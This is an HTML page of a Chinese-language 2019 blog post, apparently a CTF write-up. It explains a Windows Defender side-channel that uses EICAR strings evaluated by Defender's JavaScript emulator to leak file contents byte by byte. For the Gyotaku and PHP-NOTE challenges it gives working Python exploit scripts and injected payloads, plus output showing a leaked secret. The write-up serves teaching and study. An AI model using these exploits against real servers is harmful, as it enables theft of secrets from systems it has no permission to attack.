<!DOCTYPE html>
<html lang="en-us">
  <head>
  <meta http-equiv="content-type" content="text/html;charset=utf-8">
  <meta http-equiv="X-UA-Compatible" content="chrome=1">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noodp"/>
  <meta name="author" content="n0b0dy">
  <meta name="description" content="n0b0dy&#39;s personal site">
  
  
  <link rel="prev" href="https://n0b0dycn.me/2019/08/defcon27/" />
  
  <link rel="canonical" href="https://n0b0dycn.me/2019/08/playing-with-windows-defender/" />
  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
  <link rel="shortcut icon" href="https://n0b0dycn.me/favicon.ico" />
  <link rel="bookmark" href="https://n0b0dycn.me/favicon.ico" type="image/x-icon"　/>
  <link rel="manifest" href="/site.webmanifest">
  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
  <meta name="msapplication-TileColor" content="#da532c">
  <meta name="theme-color" content="#ffffff">
  <title>
       
       
           Playing with Windows Defender | n0b0dy&#39;s site
       
  </title>
  <meta name="title" content="Playing with Windows Defender | n0b0dy&#39;s site">
    
  
  <link rel="stylesheet" href="/font/iconfont.css">
  <link rel="stylesheet" href="/css/main.min.css">


   

<script type="application/ld+json">
    {
        "@context" : "http://schema.org",
        "@type" : "BlogPosting",
        "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https:\/\/n0b0dycn.me\/"
        },
        "articleSection" : "posts",
        "name" : "Playing with Windows Defender",
        "headline" : "Playing with Windows Defender",
        "description" : "本文章总结了TokyoWesterns在WCTF上命的Gyotaku和TWCTF上的PHP-NOTE这两道题涉及的Windows Defender相关的侧信道攻击。\nWindows Defender Windows defender是windows上的防护软件，TokyoWesterns在WCTF 2019上提出了一种针对于Windows Defender的侧信道攻击方式AVOracal。\nwindows defender行为 根据TokyoWesterns的调研，Windows Defender会进行以下行为：\n 检查文件内容中是否有恶意内容 改变恶意文件的权限避免用户访问 将文件中的恶意内容替换为null 删除恶意文件  其中在第二步中，如果恶意文件被Windows Defender检测出，用户则不能访问该文件。\n触发Windows Defender EICAR测试文件可以方便地触发windows defender，其文件内容如下：\nX5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*  Emulator Windows Defender中的mpengine.dll是Windows Defender的核心dll。其包含对许多文件内容的分析功能，其中包含JScript引擎。该引擎可分析HTML文档，且可以分析其中的JavaScript代码，包括代码中对DOM元素的访问。\n笔者在本机上进行测试，如下内容可以触发Windows Defender：\n\u0026lt;script\u0026gt; var body = document.body.innerHTML; var mal = \u0026quot;X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\u0026quot;; eval(mal); \u0026lt;/script\u0026gt; \u0026lt;body\u0026gt;\u0026lt;/body\u0026gt;  再访问该文件会被阻止：\nPS C:\\Users\\n0b0dy\\Desktop\u0026gt; type .\\eicar.txt type : 无法成功完成操作，因为文件包含病毒或潜在的垃圾软件。 所在位置 行:1 字符: 1 + type .\\eicar.txt + ~~~~~~~~~~~~~~~~ + CategoryInfo : ReadError: (C:\\Users\\n0b0dy\\Desktop\\eicar.txt:String) [Get-Content], IOException + FullyQualifiedErrorId : GetContentReaderIOError,Microsoft.",
        "inLanguage" : "en-US",
        "author" : "n0b0dy",
        "creator" : "n0b0dy",
        "publisher": {
            "@type": "Organization",
            "name": "n0b0dy",
            "url": "https:\/\/n0b0dycn.me\/",
            "logo": {
                "@type": "ImageObject",
                "url": "%!s(\x3cnil\x3e)\/images\/me\/avatar.png","width": 211,
                "height": 192
            }
        },
        "image": {},
        "accountablePerson" : "n0b0dy",
        "copyrightHolder" : "n0b0dy",
        "copyrightYear" : "2019",
        "datePublished": "2019-08-31T20:51:25+08:00",
        "dateModified" : "2019-08-31T20:51:25+08:00",
        "url" : "https:\/\/n0b0dycn.me\/2019\/08\/playing-with-windows-defender\/",
        "wordCount" : "582",
        "keywords" : [ "web","ctf","windows","Blog" ]
    }
    </script>


  
  <script type="text/javascript"
        async
        src="https://cdn.bootcss.com/mathjax/2.7.3/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
MathJax.Hub.Config({
  tex2jax: {
    inlineMath: [['$','$'], ['\\(','\\)']],
    displayMath: [['$$','$$'], ['\[\[','\]\]']],
    processEscapes: true,
    processEnvironments: true,
    skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
    TeX: { equationNumbers: { autoNumber: "AMS" },
         extensions: ["AMSmath.js", "AMSsymbols.js"] }
  }
});

MathJax.Hub.Queue(function() {
    
    
    
    var all = MathJax.Hub.getAllJax(), i;
    for(i = 0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';
    }
});
</script>

<style>
code.has-jax {
    font: inherit;
    font-size: 100%;
    background: inherit;
    border: inherit;
    color: #515151;
}
</style>
</head>

  


  <body class="">
    <div class="wrapper">
        <nav class="navbar">
    <div class="container">
        <div class="navbar-header header-logo">
        	<a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href="https://n0b0dycn.me/">n0b0dy&#39;s site</a>
        </div>
        <div class="menu navbar-right">
                
                
                <a class="menu-item" href="/posts/" title="">Blog</a>
                
                <a class="menu-item" href="/categories/" title="">Categories</a>
                
                <a class="menu-item" href="/links/" title="">Links</a>
                
                <a class="menu-item" href="/about/" title="">About</a>
                
        </div>
    </div>
</nav>
<nav class="navbar-mobile" id="nav-mobile" style="display: none">
     <div class="container">
        <div class="navbar-header">
            <div>  <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href="https://n0b0dycn.me/">n0b0dy&#39;s site</a></div>
            <div class="menu-toggle">
                <span></span><span></span><span></span>
            </div>
        </div>
     
          <div class="menu" id="mobile-menu">
                
                
                <a class="menu-item" href="/posts/" title="">Blog</a>
                
                <a class="menu-item" href="/categories/" title="">Categories</a>
                
                <a class="menu-item" href="/links/" title="">Links</a>
                
                <a class="menu-item" href="/about/" title="">About</a>
                
        </div>
    </div>
</nav>
    	 <main class="main">
          <div class="container">
      		
<article class="post-warp">
    <header class="post-header">
        <h1 class="post-title">Playing with Windows Defender</h1>
        <div class="post-meta">
                Written by <a href="https://n0b0dycn.me/" rel="author">n0b0dy</a> with ♥ 
                <span class="post-time">
                on <time datetime=2019-08-31 itemprop="datePublished">August 31, 2019</time>
                </span>
                in
                <i class="iconfont icon-folder"></i>
                <span class="post-category">
                        <a href="https://n0b0dycn.me/categories/ctf/"> CTF </a>
                        <a href="https://n0b0dycn.me/categories/security/"> Security </a>
                        
                </span>
                <span class="post-tags">
                    
                        <section>
                        <i class="iconfont icon-tag"></i>Tag(s): 
                        
                        <span class="tag"><a href="https://n0b0dycn.me/tags/web/">
                                #web</a></span>
                        
                        <span class="tag"><a href="https://n0b0dycn.me/tags/ctf/">
                                #ctf</a></span>
                        
                        <span class="tag"><a href="https://n0b0dycn.me/tags/windows/">
                                #windows</a></span>
                        
                        </section>
                    
                    </span>
        </div>
    </header>
    <div class="post-content">
        

        

        
        
     
          
          
          

          
          
          

          

<p>本文章总结了TokyoWesterns在WCTF上命的Gyotaku和TWCTF上的PHP-NOTE这两道题涉及的Windows Defender相关的侧信道攻击。</p>

<h2 id="windows-defender">Windows Defender</h2>

<p>Windows defender是windows上的防护软件，TokyoWesterns在WCTF 2019上提出了一种针对于Windows Defender的侧信道攻击方式AVOracal。</p>

<h3 id="windows-defender行为">windows defender行为</h3>

<p>根据TokyoWesterns的调研，Windows Defender会进行以下行为：</p>

<ol>
<li>检查文件内容中是否有恶意内容</li>
<li>改变恶意文件的权限避免用户访问</li>
<li>将文件中的恶意内容替换为null</li>
<li>删除恶意文件</li>
</ol>

<p>其中在第二步中，如果恶意文件被Windows Defender检测出，用户则不能访问该文件。</p>

<h3 id="触发windows-defender">触发Windows Defender</h3>

<p>EICAR测试文件可以方便地触发windows defender，其文件内容如下：</p>

<pre><code>X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
</code></pre>

<h3 id="emulator">Emulator</h3>

<p>Windows Defender中的mpengine.dll是Windows Defender的核心dll。其包含对许多文件内容的分析功能，其中包含JScript引擎。该引擎可分析HTML文档，且可以分析其中的JavaScript代码，包括代码中对DOM元素的访问。</p>

<p>笔者在本机上进行测试，如下内容可以触发Windows Defender：</p>

<pre><code class="language-html">&lt;script&gt;
var body = document.body.innerHTML;
var mal = &quot;X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*&quot;;
eval(mal);
&lt;/script&gt;
&lt;body&gt;&lt;/body&gt;
</code></pre>

<p>再访问该文件会被阻止：</p>

<pre><code>PS C:\Users\n0b0dy\Desktop&gt; type .\eicar.txt                                                       type : 无法成功完成操作，因为文件包含病毒或潜在的垃圾软件。                                            所在位置 行:1 字符: 1
+ type .\eicar.txt
+ ~~~~~~~~~~~~~~~~
    + CategoryInfo  : ReadError: (C:\Users\n0b0dy\Desktop\eicar.txt:String) [Get-Content], IOException
    + FullyQualifiedErrorId : GetContentReaderIOError,Microsoft.PowerShell.Commands.GetContentCommand
</code></pre>

<p>但是如果不加第二行<code>var body = document.body.innerHTML;</code>的话，则无法触发Windows Defender。</p>

<p>下文件会被阻止（通过dom获取最后一个字符）：</p>

<pre><code class="language-html">&lt;script&gt;
var body = document.body.innerHTML;
var n = body[0];
var mal = &quot;X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H&quot;+n;
eval(mal);
&lt;/script&gt;
&lt;body&gt;*&lt;/body&gt;
</code></pre>

<p>而以下文件则不会：</p>

<pre><code class="language-html">&lt;script&gt;
var body = document.body.innerHTML;
var n = body[0];
var mal = &quot;X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H&quot;+n;
eval(mal);
&lt;/script&gt;
&lt;body&gt;a&lt;/body&gt;
</code></pre>

<p>根据该特性，侧信道攻击方式如下：</p>

<pre><code>eval(&quot;EICA&quot;+input) -&gt; ?
    detected -&gt; input is 'R'
    not detected -&gt; input is not 'R'
</code></pre>

<h2 id="gyotaku-wctf-2019">Gyotaku (WCTF 2019)</h2>

<p>题目链接：<a href="https://github.com/icchy/wctf2019-gtf" rel="nofollow noreferrer" target="_blank">Gyotaku</a></p>

<p>这道题是WCTF中一道让TW很蛋疼的题。该题有一个<code>/flag</code>路径，只允许127.0.0.1访问。但是题目使用echo框架开发，<code>echo.Context.RealIP</code>可以被<code>X-Real-IP: 127.0.0.1</code>欺骗。于是这道题就被全场都做出来了。</p>

<p>预期解如下：</p>

<p><code>POST /gyotaku</code>接受url参数，访问该url并将其返回内容储存，具体代码如下：</p>

<pre><code class="language-go">// save gyotaku
gyotakudata := &amp;GyotakuData{
    URL:      url,
    Data:     string(body),
    UserName: username,
}

buf := bytes.NewBuffer(nil)
err = gob.NewEncoder(buf).Encode(gyotakudata)
if err != nil {
    return err
}
err = ioutil.WriteFile(path.Join(GyotakuDir, gid), buf.Bytes(), 0644)
if err != nil {
    return err
}
</code></pre>

<p>由于我们可以控制url和username，我们构造如下参数：</p>

<pre><code>url=http://127.0.0.1/flag?a=&lt;script&gt;[script]&lt;/script&gt;&lt;body&gt;
username=&lt;/body&gt;
</code></pre>

<p>则可以使生成的文件以被Windows Defender识别。其中<code>[script]</code>的内容如下：</p>

<pre><code class="language-html">&lt;script&gt;f=function(n){eval('X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H'+{${c}:'*'}[Math.min(${c},n)])};f(document.body.innerHTML[${idx}].charCodeAt(0));&lt;/script&gt;&lt;body&gt;
</code></pre>

<p>其中<code>${c}</code>是猜测的字符，<code>${idx}</code>是body中的字符的索引。对每个字符，我们使用二分搜索来加速搜索速度。最终作者给出的exp如下：</p>

<pre><code class="language-python">import requests

URL = &quot;http://192.168.122.78&quot; # changeme

def randstr(n=8):
    import random
    import string
    chars = string.ascii_uppercase + string.ascii_lowercase + string.digits
    return ''.join([random.choice(chars) for _ in range(n)])

def trigger(c, idx, sess):
    import string
    prefix = randstr()
    p = prefix + '''&lt;script&gt;f=function(n){eval('X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H'+{${c}:'*'}[Math.min(${c},n)])};f(document.body.innerHTML[${idx}].charCodeAt(0));&lt;/script&gt;&lt;body&gt;'''
    p = string.Template(p).substitute({'idx': idx, 'c': c})
    req = sess.post(URL + '/gyotaku', data={'url': 'http://127.0.0.1/flag?a=' + p})
    return req.json()

def leak(idx, sess):
    l, h = 0, 0x100
    while h - l &gt; 1:
        m = (h + l) // 2
        gid = trigger(m, idx, sess)
        if sess.get(URL + '/gyotaku/' + gid).status_code == 500:
            l = m
        else:
            h = m
    return chr(l)

sess = requests.session()
sess.post(URL + '/login', data={'username': '&lt;/body&gt;'+randstr(), 'password': randstr()})

data = ''
for i in range(30):
    data += leak(i, sess)
    print(data)
</code></pre>

<h2 id="php-note">PHP-NOTE</h2>

<p>由于WCTF的失误，这种攻击方式再TWCTF-2019中又出了一次。</p>

<p>首先在<code>http://phpnote.chal.ctf.westerns.tokyo/?action=source</code>中得到题目源码。映入眼帘的是一个反序列化：</p>

<pre><code class="language-php">class Note {
....
    public function getflag() {
        if ($this-&gt;isadmin === true) {
            echo FLAG;
        }
    }
}

if (is_login()) {
    $realname = $_SESSION['realname'];
    $nickname = $_SESSION['nickname'];
    
    $note = verify($_COOKIE['note'], $_COOKIE['hmac'])
            ? unserialize(base64_decode($_COOKIE['note']))
            : new Note(false);
}

</code></pre>

<p>其中涉及到一个vertiry，用到一个secret：</p>

<pre><code class="language-php">function verify($data, $hmac) {
    $secret = $_SESSION['secret'];
    if (empty($secret)) return false;
    return hash_equals(hash_hmac('sha256', $data, $secret), $hmac);
}

function hmac($data) {
    $secret = $_SESSION['secret'];
    if (empty($data) || empty($secret)) return false;
    return hash_hmac('sha256', $data, $secret);
}

function gen_secret($seed) {
    return md5(SALT . $seed . PEPPER);
}
.....
if ($action === 'login') {
    if ($method === 'POST') {
        $nickname = (string)$_POST['nickname'];
        $realname = (string)$_POST['realname'];

        if (empty($realname) || strlen($realname) &lt; 8) {
            die('invalid name');
        }

        $_SESSION['realname'] = $realname;
        if (!empty($nickname)) {
            $_SESSION['nickname'] = $nickname;
        }
        $_SESSION['secret'] = gen_secret($nickname);
    }
    redirect('index');
}
</code></pre>

<p>可知secret只与nickname有关。但是我们没法攻击hmac函数来获得secret。在看了一圈之后，我们发现服务器是IIS的：</p>

<pre><code>Server: Microsoft-IIS/10.0
X-Powered-By: PHP/7.3.9
</code></pre>

<p>结合前文所述攻击手法，整理思路如下：</p>

<ol>
<li>PHP的session储存在文件系统中</li>
<li>向session中注入恶意内容让Windows Defender屏蔽生成的session文件</li>
<li>通过能否登录成功，我们可以逐字节泄露secret。</li>
</ol>

<p>仿照Gyotaku的攻击脚本我们很容易写出exp：</p>

<pre><code class="language-php">#!/usr/bin/env python3

import requests

CHAL_URL = &quot;http://phpnote.chal.ctf.westerns.tokyo/&quot;
TEST_URL = &quot;http://192.168.21.132/&quot;

def trigger(c, idx, payload=''):
    sess = requests.Session()
    import string
    payload = '''--!&gt;&lt;html&gt;&lt;head&gt;&lt;script&gt;f=function(n){eval('X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H'+{${c}:'*'}[Math.min(${c},n)])};f(document.body.innerHTML[${idx}].charCodeAt(0));&lt;/script&gt;&lt;/head&gt;&lt;body&gt;'''
    payload = string.Template(payload).substitute({'idx': idx, 'c': c})
    d1 = {
        &quot;nickname&quot;: &quot;&quot;,
        &quot;realname&quot;: payload,
    }
    resp = sess.post(CHAL_URL + &quot;?action=login&quot;, data=d1)
    d = {
        &quot;nickname&quot;: &quot;1&lt;/body&gt;&quot;,
        &quot;realname&quot;: payload,
    }
    resp = sess.post(CHAL_URL + &quot;?action=login&quot;, data=d)
    resp = sess.get(CHAL_URL + &quot;?action=index&quot;)
    # print(sess.cookies)
    return &quot;logout&quot; not in resp.text

def leak(idx):
    l, h = 0, 0x100
    while h - l &gt; 1:
        m = (h + l) // 2
        res = trigger(m, idx)
        if res:
            l = m
        else:
            h = m
    return chr(l)

data = &quot;&quot;
for i in range(13,100):
    data += leak(i)
    print(data)
</code></pre>

<p>成功将secret泄露出：</p>

<pre><code>➜  twctf-19 ./exp-phpnote.py                                                                     
:
:&quot;
:&quot;7
:&quot;7d
:&quot;7da
:&quot;7dae
........
:&quot;7daeeed052fd2908fb30f462ad1c7936
:&quot;7daeeed052fd2908fb30f462ad1c7936&quot;
</code></pre>

<p>之后构造反序列化即可得到flag。</p>

<h2 id="reference">Reference</h2>

<ul>
<li><a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Bulazel-Windows-Offender-Reverse-Engineering-Windows-Defenders-Antivirus-Emulator.pdf" rel="nofollow noreferrer" target="_blank">Windows Offender: Reverse Engineering Windows Defender&rsquo;s Antivirus Emulator</a></li>
<li><a href="https://westerns.tokyo/wctf2019-gtf/wctf2019-gtf-slides.pdf" rel="nofollow noreferrer" target="_blank">WCTF2019: Gyotaku Writeup</a></li>
</ul>

    </div>

    <div class="post-copyright">
             
            <p class="copyright-item">
                <span>Author:</span>
                <span>n0b0dy </span>
                </p>
            
           
             
            <p class="copyright-item">
                    <span>Link:</span>
                    <a href=https://n0b0dycn.me/2019/08/playing-with-windows-defender/>https://n0b0dycn.me/2019/08/playing-with-windows-defender/</span>
            </p>
            
            
    </div>

    <div class="post-nav">
        
        <a href="https://n0b0dycn.me/2019/08/defcon27/" class="prev" rel="prev" title="Defcon 27游记"><i class="iconfont icon-left"></i>&nbsp;Defcon 27游记</a>
         
        
    </div>

    <div class="post-comment">
          
                 
          
    </div>
</article>
          </div>
		   </main>
      <footer class="footer">
    <div class="copyright">
        &copy;
        
        <span itemprop="copyrightYear">2011 - 2019</span>
        
        <span class="with-love">
    	 <i class="iconfont icon-love"></i> 
         </span>
         
            <span class="author" itemprop="copyrightHolder"><a href="https://n0b0dycn.me/">n0b0dy</a> | </span> 
         

         
		  <span>Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow">Hugo</a> & <a href="https://github.com/liuzc/leaveit" target="_blank" rel="external nofollow">LeaveIt</a></span> 
    </div>
</footer>












    
    
    <script src="/js/vendor_no_gallery.min.js" async=""></script>
    
  



     </div>
  </body>
</html>
